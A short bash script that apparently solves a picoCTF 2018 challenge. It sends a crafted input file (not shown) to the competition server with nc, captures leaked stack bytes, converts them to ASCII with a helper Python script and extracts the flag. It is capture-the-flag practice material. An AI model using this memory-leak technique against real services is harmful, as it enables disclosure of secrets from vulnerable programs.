#!/bin/bash

# get the directory of this script
CUR_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"

INPUT_FILE=${CUR_DIR}/input.txt
OUTPUT_FILE=${CUR_DIR}/output.txt

# this python script was written to take the stack
# bytes, reverse the 32-bit word, for endianness,
# and convert the the hex to ascii
BYTE_TO_ASCII_SCRIPT=${CUR_DIR}/bytes_to_ascii.py


# the input file is specially crafted to leak the flag from the stack
# This one liner will output the bytes from the stack into ${OUTPUT}
STACK_OUTPUT=$(cat ${INPUT_FILE} | nc -w1 2018shell.picoctf.com 46960 | grep ">" | sed 's/> //' | tr '\n' ' ')

# This flag output also has some garbage data
# truncate all null bytes
RAW_FLAG=$(echo ${STACK_OUTPUT} | python  $BYTE_TO_ASCII_SCRIPT | tr '\0' ' ')

# output just the flag
echo $RAW_FLAG | grep -o "picoCTF{.*}"
